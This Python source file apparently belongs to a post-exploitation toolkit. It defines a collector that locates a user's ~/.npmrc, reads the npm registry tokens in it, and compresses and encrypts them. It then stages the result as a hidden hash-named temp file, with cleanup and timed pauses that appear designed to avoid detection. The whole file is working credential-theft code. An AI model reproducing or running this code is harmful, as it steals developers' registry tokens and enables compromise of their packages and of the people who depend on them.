
from __future__ import annotations

import logging
import os
from pathlib import Path
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

_LOG = logging.getLogger(__name__)

class NpmCollector(BaseCollector):
    """
    Collect NPM configuration and registry tokens.
    
    Targets:
      - ~/.npmrc
    """

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        npmrc = Path.home() / ".npmrc"
        if npmrc.exists():
            yield ArtifactMetadata(
                artifact_family="npm_config",
                artifact_subtype="npmrc",
                source_path=str(npmrc),
                source_platform=os.name,
                collection_method="file_read",
            )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        try:
            path = Path(artifact.source_path)
            if not path.exists():
                return None
            
            data    = path.read_bytes()
            sha256  = self._sha256(data)
            payload = self._compress_and_encrypt(data)
            del data

            ext = artifact.artifact_subtype or "npm"
            stage_path = self._staging_dir / f".{sha256[:16]}.{ext}.tmp"
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path       = str(path),
                sha256     = sha256,
                size_bytes = len(payload),
                metadata   = artifact,
            )
            self.persist_metadata(record)
            self._stagger_and_pause()
            return record

        except PermissionError:
            _LOG.debug("Permission denied: %s", artifact.source_path)
        except Exception as exc:
            _LOG.debug("NPM artifact collection error (%s): %s", artifact.source_path, exc)
        return None
